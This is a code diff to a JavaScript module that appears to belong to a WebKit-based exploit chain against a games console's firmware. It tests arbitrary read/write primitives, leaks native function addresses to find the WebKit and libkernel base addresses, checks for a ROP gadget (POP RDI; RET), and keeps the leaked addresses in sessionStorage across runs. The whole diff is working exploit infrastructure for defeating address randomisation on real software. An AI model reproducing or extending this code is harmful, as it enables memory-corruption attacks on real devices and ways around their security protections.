@@ -72,18 +72,30 @@ function leakNativeFn(p, off, fn, label) {
     return { label, fn, cell, jsFunction: mid, nativeFn };
 }
 
+function parseSessionAddr(raw) {
+    if (!raw) return null;
+    let s = String(raw).trim().replace(/^0x/i, "");
+    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
+    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
+    if (s.length < 16) s = s.padStart(16, "0");
+    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
+}
+
+function sessionAddr(key) {
+    try { return parseSessionAddr(sessionStorage.getItem(key)); } catch (_) { return null; }
+}
+
 /**
- * @param {object} p window.p
- * @param {object} off firmware offsets
- * @param {object} carrier from establishPrimitive
  * @param {{ log: function, readPrimitivePass?: boolean, pairStatus?: object,
- *           probeModules?: boolean, verboseLeak?: boolean }} ctx
+ *           probeModules?: boolean, verboseLeak?: boolean,
+ *           lk2eOk?: boolean, sessionWebkit?: object, sessionLk?: object }} ctx
  */
 export function runArwProofVerbose(p, off, carrier, ctx) {
     ctx = ctx || {};
     const log = ctx.log || (() => {});
     const verboseLeak = ctx.verboseLeak === true;
     const probeModules = ctx.probeModules === true;
+    const lk2eOk = ctx.lk2eOk === true;
     const addresses = [];
     const results = {
         readPrimitivePass: !!ctx.readPrimitivePass,
@@ -93,6 +105,8 @@ export function runArwProofVerbose(p, off, carrier, ctx) {
         arrayBufferWrite: false,
         webkitVerified: false,
         libkernelVerified: false,
+        webkitFrom2e: false,
+        lkFrom2e: false,
     };
 
     function record(label, addr, note) {
@@ -331,74 +345,104 @@ export function runArwProofVerbose(p, off, carrier, ctx) {
     if (piNative)
         try { sessionStorage.setItem("wk-nativeFn", String(piNative)); } catch (_) { }
 
-    let webkitBase = null;
-    if (!probeModules) {
-        step("WEBKIT", "SKIP", "module memory probes off (default — avoids OOM on bad base)"
-            + "  add ?modules=1 to probe ELF/lk");
-        step("LIBKERNEL", "SKIP", "requires ?modules=1 and verified webkit base");
-    } else {
+    let webkitBase = ctx.sessionWebkit || sessionAddr("wk-webkitBase");
+    let libkernelBase = ctx.sessionLk || sessionAddr("wk-libkernelBase");
+
+    step("MODULES", "BEGIN", "session wb=" + fmtAddr(webkitBase)
+        + " lk=" + fmtAddr(libkernelBase)
+        + " 2e=" + (lk2eOk ? "ok" : "miss")
+        + " probe=" + (probeModules ? "on" : "off"));
+
+    if (webkitBase) {
+        results.webkitFrom2e = true;
+        record("webkitBase.session", webkitBase, "2e or persistWebkitBasesLight");
+        pass("WEBKIT", "SESSION", fmtAddr(webkitBase) + "  (already have base — not re-derived)");
+        if (probeModules) {
+            const magic = read4p(p, webkitBase);
+            step("WEBKIT", "ELF-PEEK", "magic=" + fmtHex32(magic)
+                + (magic === ELF_MAGIC ? "  (ELF OK)" : ""));
+            if (magic === ELF_MAGIC) {
+                results.webkitVerified = true;
+                pass("WEBKIT", "ELF-OK", "@ session base");
+            } else if (off.wk_POP_RDI_RET != null
+                && checkGadgetBytes(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3])) {
+                results.webkitVerified = true;
+                pass("WEBKIT", "POP_RDI-OK", "@+" + off.wk_POP_RDI_RET.toString(16));
+            } else {
+                warn("WEBKIT", "ELF-MISS", "peek failed @ session base — 2e base still used, not re-guessed");
+            }
+        } else {
+            results.webkitVerified = true;
+            step("WEBKIT", "TRUST-2E", "modules off — using session webkit (no ELF peek)");
+        }
+    } else if (probeModules && piNative) {
         const parseIntOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
-        if (piNative && parseIntOff != null) {
+        if (parseIntOff != null) {
             webkitBase = alignModuleBase(piNative.sub32(parseIntOff));
-            record("webkitBase", webkitBase, "align16(native - 0x" + parseIntOff.toString(16) + ")");
-            step("WEBKIT", "BASE-CANDIDATE", fmtAddr(webkitBase));
-            if (!plausibleModuleBase(webkitBase)) {
-                warn("WEBKIT", "SKIP-PROBE", "base not 16KB-aligned — will not read module memory");
-                webkitBase = null;
-            } else {
+            step("WEBKIT", "DERIVE", fmtAddr(webkitBase) + "  (no session — native - 0x"
+                + parseIntOff.toString(16) + ")");
+            if (plausibleModuleBase(webkitBase)) {
                 const magic = read4p(p, webkitBase);
-                step("WEBKIT", "ELF-PEEK", "magic=" + fmtHex32(magic)
-                    + (magic === ELF_MAGIC ? "  (ELF OK)" : ""));
-                if (magic === ELF_MAGIC) {
+                if (magic === ELF_MAGIC
+                    || (off.wk_POP_RDI_RET != null
+                        && checkGadgetBytes(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3]))) {
                     results.webkitVerified = true;
-                    pass("WEBKIT", "ELF-MAGIC", fmtAddr(webkitBase));
-                } else if (off.wk_POP_RDI_RET != null
-                    && checkGadgetBytes(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3])) {
-                    results.webkitVerified = true;
-                    pass("WEBKIT", "POP_RDI", "@+" + off.wk_POP_RDI_RET.toString(16));
-                } else {
-                    warn("WEBKIT", "UNVERIFIED", "ELF/gadget miss — skipping lk IAT (no wild reads)");
-                }
-                if (results.webkitVerified)
+                    pass("WEBKIT", "DERIVED-OK", fmtAddr(webkitBase));
                     try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
-            }
-        } else {
-            warn("WEBKIT", "SKIP", "no native fn or offset for base leak");
-        }
-
-        if (webkitBase && results.webkitVerified
-            && off.wk___imp___error != null && off.k__error != null) {
-            const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
-            if (errorFn) {
-                const lk = alignModuleBase(errorFn.sub32(off.k__error));
-                record("libkernelBase", lk, "__imp___error - k__error");
-                step("LIBKERNEL", "BASE-CANDIDATE", fmtAddr(lk));
-                const w0 = read4p(p, lk);
-                const w1 = read4p(p, lk.add32(4));
-                step("LIBKERNEL", "PROLOGUE", "w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
-                if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
-                    results.libkernelVerified = true;
-                    pass("LIBKERNEL", "_error-prologue", fmtAddr(lk));
-                    try { sessionStorage.setItem("wk-libkernelBase", String(lk)); } catch (_) { }
                 } else {
-                    warn("LIBKERNEL", "UNVERIFIED", "prologue mismatch (13.52 IAT may differ from 13.50)");
+                    warn("WEBKIT", "DERIVE-FAIL", "ELF/gadget miss on derived base");
+                    webkitBase = null;
                 }
-            } else {
-                warn("LIBKERNEL", "IAT-NULL", "__imp___error unreadable");
             }
-        } else if (webkitBase && !results.webkitVerified) {
-            step("LIBKERNEL", "SKIP", "webkit unverified — no lk probe");
-        } else {
-            step("LIBKERNEL", "SKIP", "no IAT offsets or webkit base");
         }
+    } else {
+        step("WEBKIT", "NONE", "no session webkit — run 2e first or ?modules=1 with native fn");
+    }
 
-        if (webkitBase && results.webkitVerified) {
-            step("RW-TEST", "ARBITRARY-READ", "ELF header @ verified webkit base");
-            step("RW-TEST", "webkit-bytes", dumpBytes(p, webkitBase, 16));
+    if (libkernelBase || lk2eOk) {
+        results.lkFrom2e = !!(libkernelBase || lk2eOk);
+        if (libkernelBase) {
+            record("libkernelBase.session", libkernelBase, "2e Leak+lk vote");
+            pass("LIBKERNEL", "SESSION", fmtAddr(libkernelBase) + "  (from 2e — not IAT re-probe)");
+        } else {
+            pass("LIBKERNEL", "2E-FLAG", "2e reported ok but lk not in session — check LK-OK line");
         }
+        if (probeModules && libkernelBase) {
+            const w0 = read4p(p, libkernelBase);
+            const w1 = read4p(p, libkernelBase.add32(4));
+            step("LIBKERNEL", "PROLOGUE-PEEK", "w0=" + fmtHex32(w0) + " w1=" + fmtHex32(w1));
+            if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f) {
+                results.libkernelVerified = true;
+                pass("LIBKERNEL", "PROLOGUE-OK", "direct @ session lk");
+            } else {
+                results.libkernelVerified = lk2eOk;
+                if (lk2eOk)
+                    warn("LIBKERNEL", "PROLOGUE-MISS", "2e lk trusted anyway (no 13.50 IAT path)");
+                else
+                    warn("LIBKERNEL", "PROLOGUE-MISS", "prologue unexpected @ session lk");
+            }
+        } else {
+            results.libkernelVerified = lk2eOk || !!libkernelBase;
+            step("LIBKERNEL", "TRUST-2E", "using 2e vote — no extra reads"
+                + (probeModules ? "" : " (?modules=1 adds prologue peek only)"));
+        }
+    } else if (probeModules) {
+        warn("LIBKERNEL", "NONE", "no session lk — 2e miss; R/W proof does not need lk");
+    } else {
+        step("LIBKERNEL", "NONE", "2e miss — heap R/W proof unaffected");
+    }
+
+    if (probeModules && webkitBase && results.webkitVerified) {
+        step("RW-TEST", "ARBITRARY-READ", "ELF bytes @ session/verified webkit base");
+        step("RW-TEST", "webkit-bytes", dumpBytes(p, webkitBase, 16));
     }
 
     const rwOk = rwCoreOk;
+
+    const wbSummary = results.webkitVerified ? "verified"
+        : (results.webkitFrom2e ? "session" : "none");
+    const lkSummary = results.libkernelVerified ? "verified"
+        : (results.lkFrom2e ? "2e-session" : "none");
 
     step("SUMMARY", "CHECKLIST",
         "primitive=" + results.readPrimitivePass
@@ -406,12 +450,12 @@ export function runArwProofVerbose(p, off, carrier, ctx) {
         + " header=" + results.headerRoundtrip
         + " ab-read=" + results.arrayBufferRead
         + " ab-write=" + results.arrayBufferWrite
-        + " webkit=" + results.webkitVerified
-        + " lk=" + results.libkernelVerified);
-    try {
-        const lkSaved = sessionStorage.getItem("wk-libkernelBase");
-        if (lkSaved) step("SUMMARY", "2E-LK", "session lk=0x" + lkSaved.replace(/^0x/i, ""));
-    } catch (_) { }
+        + " webkit=" + wbSummary
+        + " lk=" + lkSummary);
+    if (webkitBase)
+        step("SUMMARY", "WEBKIT-BASE", fmtAddr(webkitBase));
+    if (libkernelBase)
+        step("SUMMARY", "LIBKERNEL-BASE", fmtAddr(libkernelBase));
     step("SUMMARY", "ADDRESSES", addresses.length + " recorded (see LEAK/CARRIER lines above)");
 
     if (rwOk) {
